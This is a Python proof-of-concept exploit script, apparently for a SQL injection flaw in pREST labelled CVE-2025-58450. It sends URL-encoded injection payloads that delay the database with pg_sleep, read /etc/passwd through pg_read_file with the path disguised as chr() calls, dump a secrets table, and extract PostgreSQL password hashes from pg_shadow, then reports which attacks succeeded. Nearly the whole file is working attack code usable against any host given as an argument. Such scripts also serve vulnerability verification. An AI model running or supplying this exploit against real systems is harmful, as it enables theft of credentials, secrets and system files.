#!/usr/bin/env python3
import requests
import sys
import time
import urllib.parse

TARGET_HOST = "http://localhost:3000"

def test_time_based_sqli(host):
    print("[*] Testing time-based SQL injection...")
    
    sleep_seconds = 3
    payload = f'api"."todos" where (select 1 from pg_sleep({sleep_seconds}))=1) s--'
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = f"{host}/db001/{encoded_payload}/todos"
    
    start_time = time.time()
    try:
        resp = requests.get(url, timeout=30)
        elapsed = time.time() - start_time
        
        if elapsed >= sleep_seconds - 0.5:
            print(f"[+] Time-based SQLi successful! Response delayed by {elapsed:.2f} seconds")
            return True
        else:
            print(f"[-] Time-based SQLi failed. Response time: {elapsed:.2f} seconds")
            return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def read_file_via_sqli(host, filepath):
    print(f"[*] Attempting to read file: {filepath}")
    
    chr_path = "||".join([f"chr({ord(c)})" for c in filepath])
    payload = f'api"."todos" union select pg_read_file({chr_path})) s--'
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = f"{host}/db001/{encoded_payload}/todos?_select=task"
    
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            for item in data:
                task_value = item.get('task', '')
                if '\n' in task_value and ':' in task_value:
                    print(f"[+] File content extracted:")
                    print("-" * 50)
                    print(task_value)
                    print("-" * 50)
                    return task_value
        print("[-] File read failed or file does not exist")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def read_secrets_table(host):
    print("[*] Attempting to read secrets table via direct access...")
    
    url = f"{host}/db001/api/secrets"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            print("[+] Secrets table content:")
            print("-" * 50)
            for item in data:
                print(f"  {item.get('secret_key')}: {item.get('secret_value')}")
            print("-" * 50)
            return data
        else:
            print(f"[-] Failed to read secrets: HTTP {resp.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def read_pg_shadow(host):
    print("[*] Attempting to read PostgreSQL password hashes...")
    
    payload = 'api"."todos" union select passwd from pg_shadow) s--'
    encoded_payload = urllib.parse.quote(payload, safe='')
    url = f"{host}/db001/{encoded_payload}/todos?_select=task"
    
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            print("[+] PostgreSQL password hashes:")
            print("-" * 50)
            for item in data:
                task_value = item.get('task', '')
                if task_value.startswith('SCRAM-SHA-256') or task_value.startswith('md5'):
                    print(f"  {task_value}")
            print("-" * 50)
            return True
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    host = TARGET_HOST
    if len(sys.argv) > 1:
        host = sys.argv[1]
    
    print("=" * 60)
    print("CVE-2025-58450 - pREST SQL Injection PoC")
    print("=" * 60)
    print(f"[*] Target: {host}")
    print()
    
    results = {
        "time_based_sqli": False,
        "file_read": False,
        "secrets_access": False,
        "pg_shadow_access": False
    }
    
    results["time_based_sqli"] = test_time_based_sqli(host)
    print()
    
    file_content = read_file_via_sqli(host, "/etc/passwd")
    results["file_read"] = file_content is not None
    print()
    
    secrets = read_secrets_table(host)
    results["secrets_access"] = secrets is not None
    print()
    
    results["pg_shadow_access"] = read_pg_shadow(host)
    print()
    
    print("=" * 60)
    print("Summary:")
    print("=" * 60)
    all_success = True
    for test_name, success in results.items():
        status = "SUCCESS" if success else "FAILED"
        print(f"  {test_name}: {status}")
        if not success:
            all_success = False
    
    print()
    if all_success:
        print("[+] All SQL injection tests passed - vulnerability confirmed!")
        return 0
    else:
        print("[-] Some tests failed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
